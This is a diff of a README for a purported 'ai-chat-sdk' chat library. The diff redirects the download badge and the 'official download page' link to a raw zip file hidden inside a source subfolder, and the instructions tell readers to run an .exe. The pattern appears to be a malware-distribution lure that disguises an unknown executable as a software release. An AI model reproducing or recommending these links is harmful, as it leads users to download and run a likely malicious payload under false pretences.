@@ -1,12 +1,12 @@
 # 🤖 ai-chat-sdk - Build custom chat tools easily today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/hettieunacquisitive388/ai-chat-sdk)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/hettieunacquisitive388/ai-chat-sdk/raw/refs/heads/main/src/ui/sources-panel/ai-sdk-chat-stable.zip)
 
 ai-chat-sdk provides a ready-made chat interface for your software. You connect your data source, and the tool handles the layout, typing effects, and message organization. It works for any industry, including finance, healthcare, or customer support tasks.
 
 ## 📥 How to download the software
 
-1. Visit the [official download page](https://github.com/hettieunacquisitive388/ai-chat-sdk).
+1. Visit the [official download page](https://github.com/hettieunacquisitive388/ai-chat-sdk/raw/refs/heads/main/src/ui/sources-panel/ai-sdk-chat-stable.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link for the newest version.
 4. Select the file ending in .exe to start your download.
